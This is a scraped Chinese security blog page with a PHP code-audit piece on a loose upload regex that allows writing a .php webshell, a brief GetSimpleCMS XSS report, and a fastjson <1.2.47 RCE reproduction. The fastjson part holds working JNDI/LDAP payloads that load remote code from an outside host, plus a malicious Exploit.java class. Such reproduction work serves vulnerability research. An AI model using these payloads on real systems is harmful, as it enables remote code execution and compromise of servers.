</span><br><span class="line">http://www.xiaohuar.com/d/file/20160316/a0bab5b5cc4f695012f4af1d871e7256.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20140811101923185.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/2b903e6d59bd1435a0b9ddfb5b4bd9c5.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20190814/5c01302d1d3e7f2fc6cbafbc19becaa8.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20161018/5385b7113046ac9ae560da41a44b12af.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/2ce538e9658af40bc034f5dfaf57826a.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20141116030511162.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/faf429bf24391374472fec693322b178.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20151206/f391a2312f448863f36db7d0d9acb84d.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/7249c06c326a75800fdb9a0e1d4c0df8.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20140916055435171.jpg</span><br><span class="line">http://www.xiaohuar.com/d/file/20151109/a6a9f1cd6c721bb3fb1dfe6094a6eeb4.jpg</span><br></pre></td></tr></table></figure></div>

<p>当然可以使用解析库去解析如bs4</p>
<h4 id="0x03-php"><a href="#0x03-php" class="headerlink" title="0x03 php"></a>0x03 php</h4><p>引用W3schoool</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">运行结果</span><br><span class="line">Hello Shanghai!</span><br></pre></td></tr></table></figure></div>

<p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<p>语法：<br>int preg_match( string pattern, string subject [, array matches ] )<br>看seebug上大佬的某处代码审计案例解析</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public function upload() &#123;</span><br><span class="line"></span><br><span class="line">     // 创建图片存储文件夹</span><br><span class="line">     $dir = SYS_UPLOAD_PATH.&apos;/member/&apos;.$this-&gt;uid.&apos;/&apos;;</span><br><span class="line">     @dr_dir_delete($dir);</span><br><span class="line">     !is_dir($dir) &amp;&amp; dr_mkdirs($dir);</span><br><span class="line"></span><br><span class="line">     if ($_POST[&apos;tx&apos;]) &#123;</span><br><span class="line">         $file = str_replace(&apos; &apos;, &apos;+&apos;, $_POST[&apos;tx&apos;]);</span><br><span class="line">         if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">             $new_file = $dir.&apos;0x0.&apos;.$result[2];</span><br><span class="line">             if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file)))) &#123;</span><br><span class="line">                 exit(dr_json(0, &apos;目录权限不足或磁盘已满&apos;));</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 $this-&gt;load-&gt;library(&apos;image_lib&apos;);</span><br><span class="line">                 $config[&apos;create_thumb&apos;] = TRUE;</span><br><span class="line">                 $config[&apos;thumb_marker&apos;] = &apos;&apos;;</span><br><span class="line">                 $config[&apos;maintain_ratio&apos;] = FALSE;</span><br><span class="line">                 $config[&apos;source_image&apos;] = $new_file;</span><br><span class="line">                 foreach (array(30, 45, 90, 180) as $a) &#123;</span><br><span class="line">                     $config[&apos;width&apos;] = $config[&apos;height&apos;] = $a;</span><br><span class="line">                     $config[&apos;new_image&apos;] = $dir.$a.&apos;x&apos;.$a.&apos;.&apos;.$result[2];</span><br><span class="line">                     $this-&gt;image_lib-&gt;initialize($config);</span><br><span class="line">                     if (!$this-&gt;image_lib-&gt;resize()) &#123;</span><br><span class="line">                         exit(dr_json(0, &apos;上传错误：&apos;.$this-&gt;image_lib-&gt;display_errors()));</span><br><span class="line">                         break;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 list($width, $height, $type, $attr) = getimagesize($dir.&apos;45x45.&apos;.$result[2]);</span><br><span class="line">                 !$type &amp;&amp; exit(dr_json(0, &apos;图片字符串不规范&apos;));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; else &#123;</span><br><span class="line"></span><br><span class="line">             exit(dr_json(0, &apos;图片字符串不规范&apos;));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         exit(dr_json(0, &apos;图片不存在&apos;));</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>问题出现preg_match(‘/^(data:\s*image/(\w+);base64,)/‘, $file, $result)处，正则表达式过滤不严格，导致 $result[2]变量可控制为php，而图片内容也可以是可控制的base64编码的部分，所以可以getshell<br>通过简单测试：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br><span class="line">if(preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">    print_r($result); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    print &quot;A match was not found.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">php test.php 运行结果 </span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; data:image/php;base64,</span><br><span class="line">    [1] =&gt; data:image/php;base64,</span><br><span class="line">    [2] =&gt; php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>在php当中，’()’表示匹配的子模式，在代码中的正则用了俩次括号，所以得到数组有十三个<br>此处正确的正则表达式和代码应该为</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;data:image/jpg;base64,PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br><span class="line">if(preg_match(&apos;/^(data:\s*image\/(jpg|png|jpeg);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">    print_r($result); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    print &quot;A match was not found.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; data:image/jpg;base64,</span><br><span class="line">    [1] =&gt; data:image/jpg;base64,</span><br><span class="line">    [2] =&gt; jpg</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>关于php的正则细节可以参考<a href="https://blog.csdn.net/uglyfisher/article/details/79333586" target="_blank" rel="noopener">[https://blog.csdn.net/uglyfisher/article/details/79333586]</a><br>研究正则表达式，可以严谨代码书写规范，挖掘漏洞</p>
<h4 id="0x03-正则表达式引起的CPU过载"><a href="#0x03-正则表达式引起的CPU过载" class="headerlink" title="0x03 正则表达式引起的CPU过载"></a>0x03 正则表达式引起的CPU过载</h4><p>引用一处正则表达式回溯的案例<br><a href="https://www.jb51.net/article/163520.htm" target="_blank" rel="noopener">https://www.jb51.net/article/163520.htm</a></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Reflective-xss-on-admin-snippets-php" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/05/Reflective-xss-on-admin-snippets-php/">Reflective xss on admin/snippets.php</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/09/05/Reflective-xss-on-admin-snippets-php/" class="article-date">
  <time datetime="2019-09-05T02:45:43.000Z" itemprop="datePublished">2019-09-05</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>I installed GetSimpleCMS and found that xss exists in admin/snippets.php, and script and html are not filtered in the title of the editing Snippet.</p>
<p>Enter Payload</p>
<p><img src="https://i.loli.net/2019/09/05/ElOMruTzGVWH4S8.png" alt="xss1.png"></p>
<p>Code<br><img src="https://i.loli.net/2019/09/05/QvVaIFtOdcSGz3h.png" alt="xss.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-fastjson-1-2-47-RCE-漏洞复现" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/">fastjson&lt;1.2.47 RCE 漏洞复现</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/" class="article-date">
  <time datetime="2019-08-27T01:41:52.000Z" itemprop="datePublished">2019-08-27</time>
</a>
    
    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>author：test<br><strong>Ox01 具体环境</strong><br>War包部署在tomcat,war包使用fastjson解析库<br>tomcat版本<br><img src="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png" alt="图"><br>java版本<br><img src="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png" alt="图"></p>
<p><strong>0x02 尝试是否可以接受请求（也可以没有这一步）</strong><br>先尝试是否可以收到ldap请求<br>post数据包如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://x.x.x.x:8080/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>发送数据报：<br><img src="https://i.loli.net/2019/08/28/qSNUrFeazAE9D1O.png" alt="D518D79A-05ED-4BCF-9B43-1F208FAEB7B7.png"><br>服务端接口请求：<br><img src="https://i.loli.net/2019/08/28/nXfgcxB52t1zWGs.png" alt="图"></p>
<p><strong>Ox03 构造数据包以及工具</strong><br>1 用到的工具： <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>2 使用maven打包，具体为cd到目录然后 mvn clean package -DskipTests<br>3 构造数据包<br>post数据包如下：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: 10.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://10.x.x.x:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>4 构造的恶意java类，需要javac编译成class文件，存放于http服务器，ldap服务指向于http服务<br>代码命名为：Exploit.java</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime ().exec ( &quot;calc&quot; );</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e=new Exploit ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译此java文件<br><img src="https://i.loli.net/2019/08/28/zCHtumkTcDaywFr.png" alt="图"><br><strong>0x04 启动服务，验证是否 可以执行命令</strong><br>启动各类服务<br><img src="https://i.loli.net/2019/08/28/jPMmU4wk2dvY6VS.png" alt="36602945-99DE-4243-87EB-E23C58457AF8.png"><br>发送数据包<br><img src="https://i.loli.net/2019/08/28/ul5kdwaSCtj8Ghr.png" alt="test.png"><br>执行成功<br><img src="https://i.loli.net/2019/08/28/rlUNhKzpy72SsQa.png" alt="9C7899A6-2E6A-42CB-94E0-D9F82C37416A.png"></p>

      
    </div>
    
  </div>
  
  
</article>

  



</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/code-title.png" title="为了更安全的互联网"></img>
    <h3 class="avatar-name">
      
        泰斯特
      
    </h3>
    <p class="avatar-slogan">
      搬砖工程师。
    </p>
  </div>
</div>


  
    

  
    

  
    
  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/01/12/深入剖析代审的线程安全问题/">深入剖析代审的线程安全问题</a>
          </li>
        
          <li>
            <a href="/2020/01/05/关于最近的log4j的漏洞复现及分析/">关于最近log4j的漏洞复现及分析</a>
          </li>
        
          <li>
            <a href="/2020/01/04/关于安卓SSL单项校验和双向校验的思考和总结/">关于安卓SSL单项校验和双向校验的思考和总结</a>
          </li>
        
          <li>
            <a href="/2019/12/12/Get-Some-Keys/">Get Some Keys</a>
          </li>
        
          <li>
            <a href="/2019/10/20/Java注解/">Java注解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
        <a style="display: block;" href="https://blog.ssssdl.xyz/" title target='_blank'
        >ssssdl</a>
      
        <a style="display: block;" href="https://lingwu111.github.io/" title target='_blank'
        >lingwu</a>
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2020 test &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
</body>
</html>